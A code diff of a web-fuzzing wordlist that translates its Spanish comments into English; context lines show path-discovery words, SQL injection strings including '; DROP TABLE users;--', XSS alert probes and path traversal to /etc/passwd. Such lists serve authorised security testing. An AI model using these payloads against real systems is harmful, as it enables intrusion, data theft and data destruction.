@@ -1,7 +1,7 @@
-# payloads.txt — Wordlist para fuzzing web (usar con fuzzing.py u otros fuzzers).
-# Cada linea no comentada es un payload. El marcador FUZZ se sustituye en la URL/datos.
+# payloads.txt — Wordlist for web fuzzing (use with fuzzing.py or other fuzzers).
+# Each uncommented line is a payload. The FUZZ marker is substituted in the URL/data.
 
-# ── Descubrimiento de rutas y ficheros comunes ──
+# ── Common path and file discovery ──
 admin
 administrator
 api
@@ -51,7 +51,7 @@ wp-content
 .php
 .sql
 
-# ── Valores de parametros (SQLi) ──
+# ── Parameter values (SQLi) ──
 ' OR '1'='1
 ' OR 1=1--
 " OR "1"="1
@@ -60,7 +60,7 @@ wp-content
 1 UNION SELECT NULL,NULL--
 '; DROP TABLE users;--
 
-# ── Valores de parametros (XSS) ──
+# ── Parameter values (XSS) ──
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
 "><svg/onload=alert(1)>
@@ -71,7 +71,7 @@ javascript:alert(1)
 ..%2f..%2f..%2fetc%2fpasswd
 ....//....//....//etc/passwd
 
-# ── Cabeceras / valores interesantes ──
+# ── Headers / interesting values ──
 null
 undefined
 true
